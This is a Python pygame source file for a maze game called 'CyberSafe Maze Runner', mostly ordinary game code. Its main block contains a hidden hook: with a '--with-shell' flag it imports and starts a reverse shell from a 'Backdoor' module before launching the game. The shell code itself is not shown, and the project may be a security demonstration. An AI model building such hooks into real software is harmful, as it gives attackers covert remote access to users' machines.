import os
import pygame
import sys
import random
from collections import deque
import time

# Add parent directory to path for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Game Constants
WIDTH, HEIGHT = 1000, 1000
CELL_SIZE = 40
BASE_MAZE_SIZE = 15


class Game:
    def __init__(self):
        """Initialize the game"""
        self.maze = None
        pygame.init()
        self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
        pygame.display.set_caption("CyberSafe Maze Runner")
        self.clock = pygame.time.Clock()

        # Game state
        self.level = 1
        self.difficulty = 1
        self.running = True
        self.game_active = True
        self.current_move = None
        self.move_speed = 2  # Cells per millisecond

        # Initialize game
        self._load_assets()
        self.new_level()

    def _load_assets(self):
        """Load all game assets with error handling"""
        try:
            # Create asset paths relative to the game.py file
            base_path = os.path.dirname(os.path.abspath(__file__))

            # Create sprites directory if it doesn't exist
            sprites_dir = os.path.join(base_path, "assets", "sprites")
            sounds_dir = os.path.join(base_path, "assets", "sounds")

            os.makedirs(sprites_dir, exist_ok=True)
            os.makedirs(sounds_dir, exist_ok=True)

            # Generate placeholders if files don't exist
            player_path = os.path.join(sprites_dir, "player.png")
            patch_path = os.path.join(sprites_dir, "patch.png")
            collect_path = os.path.join(sounds_dir, "collect.wav")
            win_path = os.path.join(sounds_dir, "win.wav")
            bg_path = os.path.join(sounds_dir, "background.wav")

            # Create placeholder assets if they don't exist
            self._create_placeholder_assets(player_path, patch_path, collect_path, win_path, bg_path)

            # Load assets
            self.player_img = pygame.image.load(player_path).convert_alpha()
            self.patch_img = pygame.image.load(patch_path).convert_alpha()
            self.collect_sound = pygame.mixer.Sound(collect_path)
            self.win_sound = pygame.mixer.Sound(win_path)
            pygame.mixer.music.load(bg_path)

        except Exception as e:
            print(f"Asset error: {e}")
            # Create simple placeholder assets in memory
            self.player_img = self._create_simple_surface((30, 30), (255, 0, 0))
            self.patch_img = self._create_simple_surface((20, 20), (0, 255, 0))

            # Create silent sounds
            self.collect_sound = pygame.mixer.Sound(buffer=bytearray(44100))  # 1 second of silence
            self.win_sound = pygame.mixer.Sound(buffer=bytearray(44100))  # 1 second of silence

    def _create_placeholder_assets(self, player_path, patch_path, collect_path, win_path, bg_path):
        """Create placeholder assets if they don't exist"""
        # Create player sprite if it doesn't exist
        if not os.path.exists(player_path):
            surf = pygame.Surface((30, 30), pygame.SRCALPHA)
            pygame.draw.circle(surf, (255, 0, 0), (15, 15), 15)
            pygame.image.save(surf, player_path)

        # Create patch sprite if it doesn't exist
        if not os.path.exists(patch_path):
            surf = pygame.Surface((20, 20), pygame.SRCALPHA)
            pygame.draw.rect(surf, (0, 255, 0), (0, 0, 20, 20))
            pygame.image.save(surf, patch_path)

        # Create sound files if they don't exist
        for path in [collect_path, win_path, bg_path]:
            if not os.path.exists(path):
                # Create a simple WAV file with silence
                try:
                    import wave
                    with wave.open(path, 'w') as wf:
                        wf.setnchannels(1)
                        wf.setsampwidth(2)
                        wf.setframerate(44100)
                        wf.writeframes(bytearray(44100))  # 1 second of silence
                except:
                    # If wave module fails, create an empty file
                    with open(path, 'wb') as f:
                        f.write(b'')

    def _create_simple_surface(self, size, color):
        """Create a simple colored surface"""
        surf = pygame.Surface(size, pygame.SRCALPHA)
        pygame.draw.rect(surf, color, (0, 0, size[0], size[1]))
        return surf

    def new_level(self):
        """Initialize a new level with a fresh maze and patches"""
        # Import here to avoid circular imports
        from Game.maze_generator import MazeGenerator

        self.maze = MazeGenerator(
            width=BASE_MAZE_SIZE + self.difficulty,
            height=BASE_MAZE_SIZE + self.difficulty,
            cell_size=CELL_SIZE
        )
        self.maze.generate()
        self._spawn_entities()
        self.score = 0
        self.start_time = pygame.time.get_ticks()
        pygame.mixer.music.play(-1)

    def _spawn_entities(self):
        """Place player and patches in the maze"""
        # Player position
        self.player_grid = [0, 0]
        self.player_pos = pygame.Vector2(
            CELL_SIZE // 2 + CELL_SIZE * self.player_grid[0],
            CELL_SIZE // 2 + CELL_SIZE * self.player_grid[1]
        )
        # Find accessible cells
        accessible = self._find_accessible_cells()
        # Spawn patches
        self.patches = []
        if accessible:  # Make sure we have accessible cells
            for _ in range(10 + self.difficulty * 2):
                x, y = random.choice(accessible)
                self.patches.append(pygame.Rect(
                    x * CELL_SIZE + CELL_SIZE // 4,
                    y * CELL_SIZE + CELL_SIZE // 4,
                    self.patch_img.get_width(),
                    self.patch_img.get_height()
                ))

    def _find_accessible_cells(self):
        """Find all cells reachable from the player's starting position using BFS"""
        visited = set()
        queue = deque([tuple(self.player_grid)])
        directions = [(0, -1), (1, 0), (0, 1), (-1, 0)]  # Up, Right, Down, Left
        while queue:
            x, y = queue.popleft()
            if (x, y) in visited:
                continue
            visited.add((x, y))
            for dx, dy in directions:
                nx, ny = x + dx, y + dy
                if (0 <= nx < self.maze.width and 0 <= ny < self.maze.height and
                        not self._has_wall_between((x, y), (nx, ny))):
                    queue.append((nx, ny))
        return list(visited)

    def _has_wall_between(self, current, neighbor):
        """Check if there's a wall between two adjacent cells"""
        cx, cy = current
        nx, ny = neighbor
        if nx == cx + 1:  # Right
            return self.maze.grid[cy][cx]["walls"][1]
        elif nx == cx - 1:  # Left
            return self.maze.grid[cy][cx]["walls"][3]
        elif ny == cy + 1:  # Down
            return self.maze.grid[cy][cx]["walls"][2]
        elif ny == cy - 1:  # Up
            return self.maze.grid[cy][cx]["walls"][0]
        return True

    def _handle_input(self):
        """Handle player movement input"""
        if self.current_move:
            return
        keys = pygame.key.get_pressed()
        directions = {
            pygame.K_LEFT: (-1, 0),
            pygame.K_RIGHT: (1, 0),
            pygame.K_UP: (0, -1),
            pygame.K_DOWN: (0, 1)
        }
        for key, (dx, dy) in directions.items():
            if keys[key]:
                new_x = self.player_grid[0] + dx
                new_y = self.player_grid[1] + dy
                if (0 <= new_x < self.maze.width and 0 <= new_y < self.maze.height and
                        not self._has_wall_between(tuple(self.player_grid), (new_x, new_y))):
                    self.current_move = {
                        "start": pygame.Vector2(self.player_pos),
                        "target": pygame.Vector2(
                            new_x * CELL_SIZE + CELL_SIZE // 2,
                            new_y * CELL_SIZE + CELL_SIZE // 2
                        ),
                        "start_time": pygame.time.get_ticks()
                    }
                    self.player_grid = [new_x, new_y]
                    break

    def _update_movement(self):
        """Update player position during movement"""
        if self.current_move:
            elapsed = pygame.time.get_ticks() - self.current_move["start_time"]
            progress = elapsed * self.move_speed / 1000
            if progress >= 1.0:
                self.player_pos = self.current_move["target"]
                self.current_move = None
            else:
                self.player_pos = self.current_move["start"].lerp(
                    self.current_move["target"], progress)

    def _check_collisions(self):
        """Check for patch collection and win condition"""
        player_rect = pygame.Rect(
            self.player_pos.x - self.player_img.get_width() // 2,
            self.player_pos.y - self.player_img.get_height() // 2,
            self.player_img.get_width(),
            self.player_img.get_height()
        )
        # Collect patches
        for patch in self.patches[:]:
            if player_rect.colliderect(patch):
                self.score += 10
                self.collect_sound.play()
                self.patches.remove(patch)
        # Win condition
        if not self.patches:
            self.win_sound.play()
            self.game_active = False
            self.difficulty += 1
            self._show_win_screen()

    def _show_win_screen(self):
        """Display the win screen and wait for player input"""
        # Reset player position immediately
        self.player_grid = [0, 0]
        self.player_pos = pygame.Vector2(
            CELL_SIZE // 2 + CELL_SIZE * self.player_grid[0],
            CELL_SIZE // 2 + CELL_SIZE * self.player_grid[1]
        )
        self.screen.fill((0, 0, 0))
        font = pygame.font.Font(None, 74)
        text = font.render(f"Level {self.level} Complete!", True, (0, 255, 0))
        text_rect = text.get_rect(center=(WIDTH / 2, HEIGHT / 2 - 50))
        self.screen.blit(text, text_rect)
        font = pygame.font.Font(None, 36)
        instruction = font.render("Press SPACE to continue", True, (255, 255, 255))
        instr_rect = instruction.get_rect(center=(WIDTH / 2, HEIGHT / 2 + 50))
        self.screen.blit(instruction, instr_rect)
        pygame.display.flip()
        waiting = True
        while waiting:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                    waiting = False
                    self.level += 1
                    self.game_active = True
                    self.new_level()

    def run(self):
        """Main game loop"""
        while self.running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False

            if self.game_active:
                self._handle_input()
                self._update_movement()
                self._check_collisions()

            # Drawing
            self.screen.fill((0, 0, 0))
            self.maze.draw(self.screen)
            for patch in self.patches:
                self.screen.blit(self.patch_img, patch)

            # Draw player centered
            player_rect = self.player_img.get_rect(center=(self.player_pos.x, self.player_pos.y))
            self.screen.blit(self.player_img, player_rect)

            # HUD
            font = pygame.font.Font(None, 36)
            texts = [
                f"Score: {self.score}",
                f"Level: {self.level}",
                f"Time: {(pygame.time.get_ticks() - self.start_time) // 1000}s"
            ]
            for i, text in enumerate(texts):
                surf = font.render(text, True, (255, 255, 255))
                self.screen.blit(surf, (10, 10 + 40 * i))

            pygame.display.flip()
            self.clock.tick(60)

        pygame.quit()
        sys.exit()


if __name__ == "__main__":
    # This allows the game to be run directly for testing
    try:
        # Check if reverse shell should be started (it won't when testing)
        if "--with-shell" in sys.argv:
            from Backdoor.reverse_shell import start_shell

            start_shell()
        Game().run()
    except Exception as e:
        print(f"Game error: {e}")
        time.sleep(5)